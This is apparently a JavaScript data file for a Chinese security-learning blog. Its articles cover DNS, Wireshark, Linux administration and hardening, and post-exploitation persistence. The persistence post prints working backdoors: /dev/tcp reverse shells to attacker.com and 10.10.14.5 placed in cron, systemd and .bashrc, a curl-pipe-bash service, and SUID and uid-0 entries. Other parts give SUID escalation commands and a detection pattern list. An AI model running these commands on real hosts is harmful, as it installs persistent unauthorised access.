export const categories = [
  {
    id: 'network',
    name: '计算机网络',
    icon: '🌐',
    children: [
      { id: 'tcp-ip', name: 'TCP/IP 基础' },
      { id: 'http-https', name: 'HTTP/HTTPS 协议' },
      { id: 'dns', name: 'DNS 解析原理' },
      { id: 'wireshark', name: 'Wireshark 抓包' },
    ]
  },
  {
    id: 'linux',
    name: 'Linux 系统',
    icon: '🐧',
    children: [
      { id: 'linux-commands', name: '常用命令速查' },
      { id: 'linux-users', name: '用户与权限管理' },
      { id: 'linux-process', name: '进程与服务管理' },
      { id: 'linux-network', name: '网络配置管理' },
    ]
  },
  {
    id: 'websec',
    name: 'Web 安全',
    icon: '🔒',
    children: [
      { id: 'sqli', name: 'SQL 注入' },
      { id: 'xss', name: 'XSS 跨站脚本' },
      { id: 'upload', name: '文件上传漏洞' },
      { id: 'lfi', name: '文件包含漏洞' },
      { id: 'rce', name: '命令执行漏洞' },
      { id: 'csrf', name: 'CSRF 请求伪造' },
      { id: 'xxe', name: 'XXE 注入' },
      { id: 'session-hijack', name: '会话劫持与固定' },
    ]
  },
  {
    id: 'attack-defense',
    name: '攻防对抗',
    icon: '⚔️',
    children: [
      { id: 'recon', name: '信息收集' },
      { id: 'privesc', name: '权限提升' },
      { id: 'persistence', name: '权限维持' },
      { id: 'lateral', name: '横向移动' },
      { id: 'anti-forensics', name: '反溯源' },
    ]
  },
  {
    id: 'domain',
    name: '域渗透',
    icon: '🏢',
    children: [
      { id: 'domain-basic', name: '域环境基础' },
      { id: 'domain-recon', name: '域信息收集' },
      { id: 'domain-attack', name: '域控攻击' },
      { id: 'domain-techniques', name: '常见攻击手法' },
    ]
  },
  {
    id: 'ir',
    name: '应急响应',
    icon: '🚨',
    children: [
      { id: 'ir-process', name: '事件处理流程' },
      { id: 'ir-linux', name: 'Linux 应急响应' },
      { id: 'ir-windows', name: 'Windows 应急响应' },
    ]
  },
  {
    id: 'tools',
    name: '工具手册',
    icon: '🛠️',
    children: [
      { id: 'nmap', name: 'Nmap' },
      { id: 'burpsuite', name: 'BurpSuite' },
      { id: 'sqlmap', name: 'SQLmap' },
      { id: 'nuclei', name: 'Nuclei' },
      { id: 'cobaltstrike', name: 'CobaltStrike' },
      { id: 'wireshark-tool', name: 'Wireshark' },
    ]
  },
  {
    id: 'websec-advanced',
    name: 'Web安全进阶',
    icon: '🔐',
    children: [
      { id: 'deserialization', name: '反序列化漏洞' },
      { id: 'ssrf', name: 'SSRF 服务端请求伪造' },
      { id: 'logic-vuln', name: '逻辑漏洞' },
      { id: 'api-security', name: 'API 安全' },
      { id: 'wasm', name: 'WebAssembly 逆向' },
    ]
  },
  {
    id: 'mobile',
    name: '移动端安全',
    icon: '📱',
    children: [
      { id: 'android-reverse', name: 'Android 逆向' },
      { id: 'android-pentest', name: 'Android 渗透测试' },
      { id: 'ios-reverse', name: 'iOS 逆向基础' },
      { id: 'miniapp-pentest', name: '小程序渗透' },
    ]
  },
  {
    id: 'cloud',
    name: '云安全',
    icon: '☁️',
    children: [
      { id: 'aws-security', name: 'AWS 安全配置' },
      { id: 'docker-security', name: 'Docker 安全' },
      { id: 'k8s-security', name: 'Kubernetes 安全' },
      { id: 'container-escape', name: '容器逃逸' },
    ]
  },
  {
    id: 'crypto',
    name: '密码学',
    icon: '🔐',
    children: [
      { id: 'crypto-basic', name: '密码学基础' },
      { id: 'hash-crack', name: '哈希与破解' },
      { id: 'symmetric-crypto', name: '对称加密' },
      { id: 'asymmetric-crypto', name: '非对称加密' },
    ]
  },
  {
    id: 're',
    name: '逆向工程',
    icon: '🔬',
    children: [
      { id: 're-basic', name: '逆向基础' },
      { id: 'x86-asm', name: 'x86 汇编' },
      { id: 'ida-pro', name: 'IDA Pro 使用' },
      { id: 'ghidra', name: 'Ghidra 使用' },
    ]
  },
  {
    id: 'internal',
    name: '内网渗透',
    icon: '🌐',
    children: [
      { id: 'internal-recon', name: '内网信息收集' },
      { id: 'proxy-tunnel', name: '代理与隧道' },
      { id: 'internal-post', name: '后渗透' },
      { id: 'apt', name: 'APT 攻击' },
    ]
  },
  {
    id: 'securedev',
    name: '安全开发',
    icon: '💻',
    children: [
      { id: 'secure-coding', name: '安全编码规范' },
      { id: 'devsecops', name: 'DevSecOps' },
      { id: 'sast-dast', name: 'SAST/DAST' },
    ]
  },
  {
    id: 'redteam',
    name: '红队技术',
    icon: '🎯',
    children: [
      { id: 'c2-framework', name: 'C2 框架' },
      { id: 'evasion', name: '免杀技术' },
      { id: 'social-eng', name: '社会工程学' },
      { id: 'webshell', name: 'Webshell 技术' },
    ]
  },
  {
    id: 'vuln-analysis',
    name: '漏洞分析',
    icon: '🔍',
    children: [
      { id: 'cve-analysis', name: 'CVE 漏洞分析' },
      { id: 'heap-overflow', name: '堆溢出利用' },
      { id: 'rop', name: 'ROP 技术' },
      { id: 'kernel-exploit', name: '内核漏洞利用' },
    ]
  },
  {
    id: 'ctf',
    name: 'CTF 竞赛',
    icon: '🏆',
    children: [
      { id: 'ctf-web', name: 'Web 方向' },
      { id: 'ctf-pwn', name: 'PWN 方向' },
      { id: 'ctf-re', name: '逆向方向' },
      { id: 'ctf-crypto', name: '密码学方向' },
    ]
  },
]

export const posts = [
  // 计算机网络 - DNS
  {
    slug: 'dns-resolution',
    title: 'DNS 解析原理详解',
    date: '2026-06-17',
    category: 'network',
    subcategory: 'dns',
    tags: ['网络', 'DNS', '基础'],
    summary: 'DNS 解析流程、记录类型、常见攻击和安全配置。',
    content: `
## 什么是 DNS

DNS（Domain Name System）域名系统，将域名转换为 IP 地址。

## 解析流程

1. **浏览器缓存** → 2. **系统缓存** → 3. **hosts 文件** → 4. **本地 DNS 服务器** → 5. **根域名服务器** → 6. **顶级域名服务器** → 7. **权威域名服务器**

## 记录类型

| 记录 | 说明 | 示例 |
|------|------|------|
| A | 域名 → IPv4 | example.com → 93.184.216.34 |
| AAAA | 域名 → IPv6 | |
| CNAME | 别名记录 | www → example.com |
| MX | 邮件服务器 | |
| NS | 域名服务器 | |
| TXT | 文本记录 | SPF/DKIM |
| SRV | 服务记录 | |
| PTR | 反向解析 | IP → 域名 |

## DNS 工具

\`\`\`bash
# 查询 A 记录
nslookup example.com
dig example.com A

# 查询所有记录
dig example.com ANY

# 指定 DNS 服务器
dig @8.8.8.8 example.com

# 反向解析
dig -x 93.184.216.34

# 追踪解析过程
dig +trace example.com
\`\`\`

## DNS 安全

### DNS 劫持
攻击者篡改 DNS 响应，将用户引导到恶意网站。

### DNS 缓存投毒
污染 DNS 缓存，使后续查询返回错误结果。

### 防御
- 使用 DNSSEC
- 使用 DoH（DNS over HTTPS）
- 使用 DoT（DNS over TLS）

## 实战技巧

\`\`\`bash
# 快速排查 DNS 解析问题
dig +short example.com          # 只返回 IP
dig +noall +answer example.com  # 只显示答案段

# 指定记录类型查询
dig example.com MX              # 查询邮件服务器
dig example.com TXT             # 查询文本记录
dig _dmarc.example.com TXT      # 查询 DMARC 策略

# DNS 服务器切换测试
dig @1.1.1.1 example.com        # 使用 Cloudflare
dig @8.8.8.8 example.com        # 使用 Google

# 批量域名解析检查
for domain in example.com google.com github.com; do
    echo "$domain: $(dig +short $domain)"
done

# DNS 缓存刷新
sudo systemd-resolve --flush-caches

# 检查本地 DNS 缓存
sudo systemd-resolve --statistics
\`\`\`

## 安全加固

- **启用 DNSSEC**：防止 DNS 欺骗和缓存投毒
  \`\`\`bash
  dig example.com +dnssec       # 检查域名是否支持 DNSSEC
  \`\`\`
- **使用 DoH/DoT 加密 DNS**：防止 DNS 查询被窃听
  \`\`\`bash
  # 系统级 DoH 配置（systemd-resolved）
  # 编辑 /etc/systemd/resolved.conf
  DNSOverTLS=yes
  DNSSEC=allow-downgrade
  \`\`\`
- **锁定 DNS 配置**：防止恶意修改 /etc/resolv.conf
  \`\`\`bash
  chattr +i /etc/resolv.conf
  \`\`\`
- **监控 DNS 异常流量**：使用 IDS/IPS 检测 DNS 隧道和异常查询
- **限制 DNS 递归查询**：仅允许内网用户使用，避免成为开放 DNS 放大器
- **使用内部 DNS 服务器**：避免直接依赖外部公共 DNS
    `
  },
  {
    slug: 'wireshark-capture',
    title: 'Wireshark 抓包分析指南',
    date: '2026-06-16',
    category: 'network',
    subcategory: 'wireshark',
    tags: ['网络', 'Wireshark', '流量分析'],
    summary: 'Wireshark 抓包工具的使用方法和过滤技巧。',
    content: `
## Wireshark 简介

Wireshark 是最流行的网络协议分析器，支持深度包检测。

## 基本操作

### 开始抓包
1. 选择网卡
2. 点击开始按钮
3. 设置捕获过滤器

### 停止抓包
点击停止按钮或 Ctrl+E

## 显示过滤器

### 协议过滤
\`\`\`
http
tcp
dns
icmp
\`\`\`

### IP 过滤
\`\`\`
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 10.0.0.1
\`\`\`

### 端口过滤
\`\`\`
tcp.port == 80
tcp.dstport == 443
udp.port == 53
\`\`\`

### HTTP 过滤
\`\`\`
http.request.method == "POST"
http.response.code == 200
http.host contains "example"
http.url contains "login"
\`\`\`

### TCP 过滤
\`\`\`
tcp.flags.syn == 1
tcp.flags.rst == 1
tcp.stream eq 5
\`\`\`

### 组合过滤
\`\`\`
http && ip.src == 192.168.1.1
(tcp.port == 80 || tcp.port == 443) && http
\`\`\`

## 常用分析技巧

### 追踪 TCP 流
右键 → Follow → TCP Stream

### 提取文件
File → Export Objects → HTTP/DICOM/SMB/TFTP

### 统计信息
Statistics → Conversations / Protocol Hierarchy / Endpoints

## 实战场景

### 分析 HTTP 请求
\`\`\`
http.request.method == "POST" && http.request.uri contains "login"
\`\`\`

### 捕获密码
\`\`\`
http.request.method == "POST"
# 然后 Follow TCP Stream 查看明文
\`\`\`

### DNS 查询
\`\`\`
dns.qry.name contains "example"
\`\`\`

## 实战技巧

\`\`\`bash
# 无 GUI 模式远程抓包（tshark）
tshark -i eth0 -w capture.pcap              # 保存抓包文件
tshark -r capture.pcap -Y "http" -T fields -e http.host  # 提取 HTTP 主机
tshark -r capture.pcap -Y "tcp.port==443" -T fields -e ip.src -e ip.dst  # 过滤 TLS 流量

# 批量分析 pcap 文件
for f in *.pcap; do
    echo "=== $f ==="
    tshark -r "$f" -q -z conv,ip | head -20
done

# 统计 DNS 查询
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort | uniq -c | sort -rn

# 统计 HTTP User-Agent
tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | sort | uniq -c | sort -rn

# 提取 HTTP POST 数据
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data
\`\`\`

## 安全加固

- **启用抓包权限管控**：非授权人员禁止抓包，防止敏感数据泄露
- **使用捕获过滤器减少敏感流量**：
  \`\`\`
  # 排除 SSH 和管理流量
  not port 22 and not host 10.0.0.1
  \`\`\`
- **TLS 分析时保护私钥安全**：分析 TLS 流量需使用私钥解密，私钥应安全存储
- **定期清理抓包文件**：抓包文件可能包含敏感凭据，分析完毕后及时删除
- **部署持续流量监控**：使用 Zeek/Suricata 替代人工抓包进行持续监控
- **保持 Wireshark 最新版本**：解析器存在漏洞历史，及时更新
    `
  },
  // Linux 系统
  {
    slug: 'linux-commands',
    title: 'Linux 常用命令速查',
    date: '2026-06-20',
    category: 'linux',
    subcategory: 'linux-commands',
    tags: ['Linux', '命令', '基础'],
    summary: '渗透测试和日常运维中最常用的 Linux 命令。',
    content: `
## 文件操作

\`\`\`bash
ls -la          # 列出文件（含隐藏）
cd /path        # 切换目录
pwd             # 当前目录
mkdir -p dir    # 创建目录
cp -r src dst   # 复制
mv src dst      # 移动/重命名
rm -rf dir      # 删除
find / -name "*.conf"  # 查找文件
locate filename # 快速查找
\`\`\`

## 文件内容

\`\`\`bash
cat file        # 查看文件
less file       # 分页查看
head -n 20 file # 前20行
tail -f file    # 实时查看
grep "pattern" file  # 搜索
grep -rn "keyword" /path  # 递归搜索
wc -l file      # 统计行数
\`\`\`

## 权限管理

\`\`\`bash
chmod 755 file  # 修改权限
chown user:group file  # 修改所有者
sudo command    # 以root执行
su - user       # 切换用户
\`\`\`

## 网络相关

\`\`\`bash
ifconfig / ip a # 查看IP
netstat -tlnp   # 查看端口
ss -tlnp        # 查看端口（新）
curl url        # HTTP请求
wget url        # 下载
ping host       # 测试连通
traceroute host # 路由追踪
\`\`\`

## 进程管理

\`\`\`bash
ps aux          # 查看进程
top / htop      # 实时进程
kill -9 PID     # 强制结束
nohup cmd &     # 后台运行
crontab -e      # 定时任务
\`\`\`

## 压缩解压

\`\`\`bash
tar -czf archive.tar.gz dir/  # 压缩
tar -xzf archive.tar.gz       # 解压
unzip file.zip                 # 解压zip
\`\`\`

## 常用组合

\`\`\`bash
# 查找SUID文件
find / -perm -4000 2>/dev/null

# 查找可写目录
find / -writable -type d 2>/dev/null

# 查看历史命令
history | grep "keyword"

# 批量杀进程
killall process_name
\`\`\`

## 实战技巧

\`\`\`bash
# 批量操作
xargs -I {} cp {} /backup/                      # 批量复制
find /var/log -name "*.log" -exec gzip {} ;    # 批量压缩日志

# 日志快速排查
journalctl -u nginx --since "1 hour ago"        # 查看最近 1 小时日志
dmesg | tail -20                                 # 查看内核消息

# 文件快速查找
fd -e py . /project                             # 使用 fd（更快的 find）
fzf                                              # 模糊查找文件

# 实时监控文件变化
inotifywait -m -r /path/to/watch                # 监控目录变化

# 磁盘使用排查
du -sh /var/log/* | sort -rh | head -10         # 查找大文件
ncdu /                                           # 交互式磁盘分析

# 快速查找大文件
find / -type f -size +100M 2>/dev/null

# 批量替换文本
sed -i 's/old/new/g' /path/to/*.conf
\`\`\`

## 安全加固

- **禁止危险命令别名**：避免 rm -rf、chmod 777 等高危操作
  \`\`\`bash
  # /etc/bash.bashrc 中添加
  alias rm='rm -i'
  \`\`\`
- **配置命令审计日志**：记录所有命令执行历史
  \`\`\`bash
  # /etc/bashrc
  export HISTTIMEFORMAT="%F %T "
  export HISTFILESIZE=10000
  \`\`\`
- **设置 sudo 超时**：防止长时间挂起的 sudo 会话
  \`\`\`bash
  # /etc/sudoers
  Defaults    timestamp_timeout=5
  \`\`\`
- **审计 crontab 和 SUID 文件**：定期检查异常定时任务和 SUID 文件
- **禁止 root 直接登录**：使用普通用户 + sudo 方式操作
- **限制历史命令存储**：避免敏感命令泄露
  \`\`\`bash
  export HISTIGNORE="&:ls:cd:clear:history"
  \`\`\`
    `
  },
  {
    slug: 'linux-users',
    title: 'Linux 用户与权限管理',
    date: '2026-06-19',
    category: 'linux',
    subcategory: 'linux-users',
    tags: ['Linux', '权限', '用户管理'],
    summary: 'Linux 用户管理、文件权限、sudo 配置和提权方法。',
    content: `
## 用户管理

\`\`\`bash
useradd username    # 创建用户
passwd username     # 设置密码
userdel username    # 删除用户
usermod -aG sudo username  # 添加到sudo组
id username         # 查看用户信息
whoami              # 当前用户
\`\`\`

## 文件权限

### 权限说明
\`\`\`
-rwxr-xr--
│└┬┘└┬┘└┬┘
│ │  │  └── 其他用户：读
│ │  └───── 所属组：读+执行
│ └──────── 所有者：读+写+执行
└────────── 文件类型（-普通 d目录 l链接）
\`\`\`

### 修改权限
\`\`\`bash
chmod 755 file      # rwxr-xr-x
chmod u+x file      # 所有者加执行
chmod g-w file      # 组去掉写
chmod o-rwx file    # 其他无权限
\`\`\`

### 特殊权限
\`\`\`bash
chmod u+s file      # SUID：执行时以所有者身份
chmod g+s dir       # SGID：目录下新文件继承组
chmod +t dir        # Sticky Bit：只有所有者能删除
\`\`\`

## SUID 提权

\`\`\`bash
# 查找SUID文件
find / -perm -4000 2>/dev/null

# 常见可提权SUID
/usr/bin/find -exec /bin/sh \\;
/usr/bin/vim -c ':!sh'
/usr/bin/nmap --interactive
\`\`\`

## sudo 配置

\`\`\`bash
# 查看sudo权限
sudo -l

# 编辑sudoers
visudo

# 允许执行特定命令
username ALL=(ALL) /usr/bin/vim
\`\`\`

## /etc/passwd 和 /etc/shadow

\`\`\`bash
# passwd 可读，包含用户信息
cat /etc/passwd

# shadow 包含密码哈希（需root）
cat /etc/shadow
\`\`\`

## 实战技巧

\`\`\`bash
# 快速创建用户并配置环境
useradd -m -s /bin/bash -G sudo newuser && passwd newuser

# 查找空密码用户
awk -F: '($2 == "" || $2 == "!" || $2 == "*") {print $1}' /etc/shadow

# 查找 UID 为 0 的异常用户（除 root 外）
awk -F: '$3 == 0 && $1 != "root" {print $1}' /etc/passwd

# 查看最近登录异常
lastlog | grep -v "Never"
lastb | head -20

# 批量修改密码
for user in user1 user2 user3; do
    echo "$user:$(openssl rand -base64 12)" | chpasswd
done

# 查看 sudo 权限
sudo -l -U username

# 锁定/解锁用户
usermod -L username       # 锁定
usermod -U username       # 解锁
passwd -S username        # 查看状态
\`\`\`

## 安全加固

- **强制密码复杂度策略**：
  \`\`\`bash
  apt install libpam-pwquality
  # /etc/security/pwquality.conf
  minlen = 12
  dcredit = -1
  ucredit = -1
  lcredit = -1
  ocredit = -1
  \`\`\`
- **限制 su 命令**：仅允许 wheel 组用户切换 root
  \`\`\`bash
  # /etc/pam.d/su
  auth required pam_wheel.so use_uid
  \`\`\`
- **配置登录失败锁定**：
  \`\`\`bash
  # /etc/pam.d/common-auth
  auth required pam_tally2.so deny=5 unlock_time=900
  \`\`\`
- **清理无用账号**：删除或锁定不再使用的系统账户
- **限制 sudo 权限**：遵循最小权限原则，避免 ALL=(ALL) ALL
- **配置闲置会话超时**：
  \`\`\`bash
  # /etc/profile
  TMOUT=600
  export TMOUT
  \`\`\`
    `
  },
  {
    slug: 'linux-process',
    title: 'Linux 进程与服务管理',
    date: '2026-06-18',
    category: 'linux',
    subcategory: 'linux-process',
    tags: ['Linux', '进程', '服务'],
    summary: 'Linux 进程管理、服务配置和定时任务。',
    content: `
## 进程管理

\`\`\`bash
ps aux              # 查看所有进程
ps -ef              # 完整格式
top                 # 实时进程
htop                # 增强版top
pstree              # 进程树
\`\`\`

## 进程操作

\`\`\`bash
kill PID            # 终止进程（SIGTERM）
kill -9 PID         # 强制终止（SIGKILL）
killall name        # 按名称终止
pkill name          # 按模式终止
nohup cmd &         # 后台运行
jobs                # 查看后台任务
fg %1               # 调回前台
\`\`\`

## Systemd 服务

\`\`\`bash
systemctl status service     # 查看状态
systemctl start service      # 启动
systemctl stop service       # 停止
systemctl restart service    # 重启
systemctl enable service     # 开机启动
systemctl disable service    # 禁用开机启动
systemctl list-units --type=service  # 列出服务
\`\`\`

## 定时任务 Crontab

\`\`\`bash
crontab -e          # 编辑定时任务
crontab -l          # 查看定时任务

# 格式：分 时 日 月 周 命令
# 每天凌晨3点执行
0 3 * * * /path/to/script.sh

# 每5分钟执行
*/5 * * * * /path/to/script.sh

# 每周一执行
0 0 * * 1 /path/to/script.sh
\`\`\`

## 日志管理

\`\`\`bash
# 常见日志位置
/var/log/syslog          # 系统日志
/var/log/auth.log        # 认证日志
/var/log/apache2/        # Apache日志
/var/log/nginx/          # Nginx日志
\`\`\`

## 开机启动项

\`\`\`bash
# 查看启动服务
systemctl list-unit-files --type=service

# 查看rc.local
cat /etc/rc.local
\`\`\`

## 实战技巧

\`\`\`bash
# 找出占用资源最多的进程
ps aux --sort=-%cpu | head -10                 # CPU Top10
ps aux --sort=-%mem | head -10                 # 内存 Top10

# 查看进程完整命令行
cat /proc/PID/cmdline | tr '\0' ' '

# 查看进程打开的文件和网络连接
lsof -p PID                                   # 打开的文件
ls -la /proc/PID/fd                            # 文件描述符

# 按端口查找进程
lsof -i :80                                    # 占用 80 端口的进程
fuser 80/tcp                                   # 同上

# 后台运行并记录日志
nohup ./script.sh > /var/log/script.log 2>&1 &

# 查看 systemd 服务日志
journalctl -u nginx -f                         # 实时查看
journalctl -u nginx --since "2026-06-20"       # 指定日期

# 优雅重启服务（不中断连接）
systemctl reload nginx
\`\`\`

## 安全加固

- **监控异常进程**：定期检查高 CPU / 可疑进程
  \`\`\`bash
  ps aux | grep -v root | awk '$3>50 {print}'
  ss -tlnp | grep -v -E ':(22|80|443|3306)\b'
  \`\`\`
- **限制 cron 访问**：只允许指定用户使用 crontab
  \`\`\`bash
  echo "root" > /etc/cron.allow
  \`\`\`
- **审计 systemd 服务**：检查异常自定义服务
  \`\`\`bash
  systemctl list-unit-files --state=enabled | grep -v -E '^(ssh|nginx|mysql|apache|cron)'
  \`\`\`
- **禁用不必要服务**：减少攻击面
- **配置进程资源限制**：防止 DoS 攻击
  \`\`\`bash
  # /etc/security/limits.conf
  * hard nproc 100
  * hard nofile 65535
  \`\`\`
- **使用 systemd 保护特性**：加固服务运行环境
  \`\`\`ini
  [Service]
  ProtectSystem=strict
  ProtectHome=true
  NoNewPrivileges=true
  \`\`\`
    `
  },
  {
    slug: 'linux-network',
    title: 'Linux 网络配置管理',
    date: '2026-06-17',
    category: 'linux',
    subcategory: 'linux-network',
    tags: ['Linux', '网络', '配置'],
    summary: 'Linux 网络配置、防火墙、VPN 和流量管理。',
    content: `
## 网络配置

\`\`\`bash
ip addr              # 查看IP地址
ip link              # 查看网络接口
ip route             # 查看路由表
ifconfig             # 传统方式（部分系统）
\`\`\`

## 端口管理

\`\`\`bash
netstat -tlnp        # 查看监听端口
ss -tlnp             # 更快的方式
lsof -i :80          # 查看端口占用
\`\`\`

## 防火墙

### iptables
\`\`\`bash
iptables -L -n       # 查看规则
iptables -A INPUT -p tcp --dport 80 -j ACCEPT  # 允许80端口
iptables -A INPUT -j DROP  # 默认拒绝
\`\`\`

### firewalld
\`\`\`bash
firewall-cmd --state          # 状态
firewall-cmd --list-all       # 查看规则
firewall-cmd --add-port=80/tcp --permanent  # 开放端口
firewall-cmd --reload         # 重载
\`\`\`

## DNS 配置

\`\`\`bash
# /etc/resolv.conf
nameserver 8.8.8.8
nameserver 114.114.114.114
\`\`\`

## hosts 文件

\`\`\`bash
# /etc/hosts
127.0.0.1 localhost
192.168.1.100 target.com
\`\`\`

## 网络诊断

\`\`\`bash
ping host           # 连通性测试
traceroute host     # 路由追踪
nslookup domain     # DNS查询
dig domain          # 详细DNS查询
curl -v url         # HTTP调试
tcpdump -i eth0     # 抓包
\`\`\`

## SSH 配置

\`\`\`bash
ssh user@host               # 连接
ssh -p 2222 user@host       # 指定端口
scp file user@host:/path    # 传输文件
ssh-keygen -t rsa           # 生成密钥
ssh-copy-id user@host       # 复制公钥
\`\`\`

## 实战技巧

\`\`\`bash
# 快速查找网络问题
ss -tlnp | grep LISTEN                         # 查看所有监听端口
ip neigh show                                   # 查看 ARP 缓存
ethtool eth0                                    # 查看网卡状态

# 抓包排查
tcpdump -i eth0 -nn host 192.168.1.100         # 抓取特定主机流量
tcpdump -i eth0 port 80 -w http.pcap            # 保存 HTTP 流量
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' # 抓取 SYN 包

# 网络连通性快速排查
mtr example.com                                # 结合 ping 和 traceroute
curl -vvv https://example.com                  # 详细 HTTP 调试

# 批量 SSH 执行网络检查
for host in $(cat hosts.txt); do
    echo "=== $host ==="
    ssh $host "ip addr show eth0 | grep inet"
done

# 网络配置持久化（Netplan）
cat /etc/netplan/*.yaml
\`\`\`

## 安全加固

- **配置基础防火墙规则**：
  \`\`\`bash
  iptables -P INPUT DROP
  iptables -P FORWARD DROP
  iptables -P OUTPUT ACCEPT
  iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
  iptables -A INPUT -i lo -j ACCEPT
  iptables -A INPUT -p tcp --dport 22 -j ACCEPT
  iptables -A INPUT -p tcp --dport 80 -j ACCEPT
  \`\`\`
- **禁用不必要的网络服务**：
  \`\`\`bash
  systemctl disable telnet.socket rsh.socket
  \`\`\`
- **SSH 安全加固**：
  \`\`\`bash
  # /etc/ssh/sshd_config
  PermitRootLogin no
  PasswordAuthentication no
  Protocol 2
  MaxAuthTries 3
  AllowUsers admin
  \`\`\`
- **启用 SYN Cookie 防护**：防止 SYN Flood 攻击
  \`\`\`bash
  echo 1 > /proc/sys/net/ipv4/tcp_syncookies
  \`\`\`
- **禁止 IP 转发**（非路由器时）：
  \`\`\`bash
  echo 0 > /proc/sys/net/ipv4/ip_forward
  \`\`\`
- **配置 fail2ban 防暴力破解**：
  \`\`\`bash
  apt install fail2ban
  # /etc/fail2ban/jail.local
  [sshd]
  enabled = true
  maxretry = 3
  bantime = 3600
  \`\`\`
- **监控网络异常流量**：部署 IDS/IPS 检测异常连接和端口扫描
    `
  },
  // 攻防对抗 - 补充
  {
    slug: 'persistence-techniques',
    title: '权限维持技术',
    date: '2026-06-07',
    category: 'attack-defense',
    subcategory: 'persistence',
    tags: ['渗透测试', '权限维持', '后门'],
    summary: '常见权限维持方法和后门技术。',
    content: `
## 权限维持方法

### 1. SSH 公钥后门

\`\`\`bash
# 写入公钥
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
\`\`\`

### 2. Crontab 定时任务

\`\`\`bash
# 每分钟执行反弹shell
* * * * * /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
\`\`\`

### 3. Systemd 服务

\`\`\`ini
# /etc/systemd/system/backdoor.service
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
Restart=always

[Install]
WantedBy=multi-user.target
\`\`\`

### 4. .bashrc 后门

\`\`\`bash
# ~/.bashrc
if [[ $- != *i* ]]; then
    /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &
fi
\`\`\`

### 5. 命令别名

\`\`\`bash
# ~/.bashrc
alias ls='ls; /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &'
\`\`\`

### 6. SUID 后门

\`\`\`bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
\`\`\`

### 7. /etc/passwd 后门

\`\`\`bash
# 添加一个uid=0的用户
echo 'hacker:$6$xxx:0:0::/root:/bin/bash' >> /etc/passwd
\`\`\`

## Windows 权限维持

### 注册表自启动

\`\`\`powershell
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
\`\`\`

### 计划任务

\`\`\`powershell
schtasks /create /tn "backdoor" /tr "C:\\backdoor.exe" /sc minute /mo 1
\`\`\`

### 服务后门

\`\`\`powershell
sc create backdoor binPath= "C:\\backdoor.exe" start= auto
\`\`\`

## 检测方法

- 检查 Crontab 异常任务
- 检查 /etc/passwd 新用户
- 检查 SUID 文件
- 检查异常进程
- 检查启动项

## 实战案例

### 案例：SSH 公钥后门 + Crontab 组合持久化

\`\`\`
攻击者获取 web 服务器低权限 shell 后的持久化操作流程：

┌──────────────────┐
│  获取初始 Shell   │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  写入 SSH 公钥    │──→ echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  部署 Crontab     │──→ 每5分钟执行反弹 shell
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  创建 Systemd 服务│──→ 注册开机自启后门服务
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  写入 .bashrc     │──→ SSH 非交互式登录时触发
└──────────────────┘
\`\`\`

\`\`\`bash
# 攻击者操作序列（真实场景复现）

# Step 1：建立 SSH 后门
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Step 2：部署 Crontab 反弹 Shell
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'") | crontab -

# Step 3：创建持久化 Systemd 服务
cat > /tmp/.hidden.service << 'EOF'
[Unit]
Description=System Update Service

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do curl -s http://10.10.14.5/update.sh | bash; sleep 3600; done"
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF
cp /tmp/.hidden.service /etc/systemd/system/.hidden.service
systemctl daemon-reload
systemctl enable --now .hidden.service

# Step 4：.bashrc 后门（SSH 非交互式触发）
cat >> ~/.bashrc << 'EOF'
if [[ $- != *i* ]]; then
    /bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" &
fi
EOF

# Step 5：隐藏 SUID 后门
cp /bin/bash /tmp/.cache_backup
chmod +s /tmp/.cache_backup
\`\`\`

\`\`\`python
# 防御检测脚本：检查多种持久化后门

import os
import subprocess
import re

def check_persistence():
    findings = []

    # 1. 检查 SSH 公钥
    ssh_dir = os.path.expanduser("~/.ssh")
    ak_path = os.path.join(ssh_dir, "authorized_keys")
    if os.path.exists(ak_path):
        with open(ak_path) as f:
            keys = f.readlines()
            for i, key in enumerate(keys):
                if len(key.strip()) > 200:
                    findings.append(f"[SSH] authorized_keys 第{i+1}行: 异常长公钥 ({len(key.strip())} chars)")

    # 2. 检查 Crontab 异常任务
    try:
        cron_output = subprocess.check_output(["crontab", "-l"], text=True, stderr=subprocess.DEVNULL)
        suspicious_patterns = ["/dev/tcp", "reverse", "nc ", "ncat", "bash -i", "curl.*|.*bash", "wget.*|.*bash"]
        for line in cron_output.splitlines():
            for pattern in suspicious_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    findings.append(f"[CRON] 可疑定时任务: {line.strip()}")
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass

    # 3. 检查 Systemd 隐藏服务
    service_dirs = ["/etc/systemd/system", "/usr/lib/systemd/system"]
    for d in service_dirs:
        if os.path.isdir(d):
            for f in os.listdir(d):
                if f.startswith(".") or f.startswith("._"):
                    findings.append(f"[SYSTEMD] 隐藏服务文件: {os.path.join(d, f)}")

    # 4. 检查 SUID 异常文件
